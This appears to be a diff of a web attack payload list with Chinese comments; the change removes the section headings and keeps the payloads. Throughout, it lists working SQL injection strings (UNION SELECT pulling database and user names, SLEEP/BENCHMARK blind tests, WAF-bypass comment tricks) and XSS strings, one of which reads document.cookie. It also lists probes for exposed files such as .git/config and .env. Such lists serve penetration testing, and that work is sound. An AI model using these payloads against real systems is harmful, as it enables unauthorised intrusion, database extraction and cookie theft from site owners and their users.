@@ -1,41 +1,25 @@
-# ===========================================
-# 第一部分：SQL 注入探测 Payload (30+ 条)
-# ===========================================
-
-# 1. 基础闭合与恒真测试
+# SQL 注入探测 Payload
 id=1' OR '1'='1
 id=1' OR '1'='1' --
 id=1' OR '1'='1' #
 id=1' OR '1'='1' /*
-
-# 2. 基于报错的测试 (试探数据库类型)
 id=1' AND '1'='2
 id=1' AND extractvalue(1,concat(0x7e,database())) --
-
-# 3. 联合查询探测列数 (Order By)
 id=1' ORDER BY 1 --
 id=1' ORDER BY 10 --
 id=1' ORDER BY 100 --
-
-# 4. 联合查询获取敏感信息 (Union Select)
 id=-1' UNION SELECT 1,2,3 --
 id=-1' UNION SELECT 1,2,3,4 --
 id=-1' UNION SELECT 1,2,3,4,5 --
 id=-1' UNION SELECT 1,database(),user(),4,5 --
-
-# 5. 布尔盲注测试 (页面无回显时的判断)
 id=1' AND '1'='1
 id=1' AND '1'='2
 id=1' AND SLEEP(5) --
 id=1' AND BENCHMARK(10000000,MD5(1)) --
-
-# 6. 针对 MySQL 的特殊特性
 id=1' AND 1=1 --
 id=1' AND 1=2 --
 id=1' AND 1=1 AND '1'='1
 id=1' AND 1=2 AND '1'='1
-
-# 7. 绕 WAF / 防火墙测试
 id=1'/*!30000OR*/'1'='1
 id=1'/**/OR/**/'1'='1
 id=1' OR 1=1#
@@ -44,18 +28,14 @@ id=1' OR '1'='1'-- -
 id=1' OR 1=1-- -
 id=1' AND 1=1-- -
 
-# ===========================================
-# 第二部分：XSS 跨站脚本探测 Payload
-# ===========================================
+# XSS 跨站脚本探测 Payload
 id=<script>alert('XSS')</script>
 id=<img src=x onerror=alert(1)>
 id="><svg/onload=alert(1)>
 id='><img src=x onerror=alert(1)>
 id=<script>alert(document.cookie)</script>
 
-# ===========================================
-# 第三部分：敏感路径/备份文件探测
-# ===========================================
+# 敏感路径探测
 path=.git/config
 path=.env
 path=backup.zip
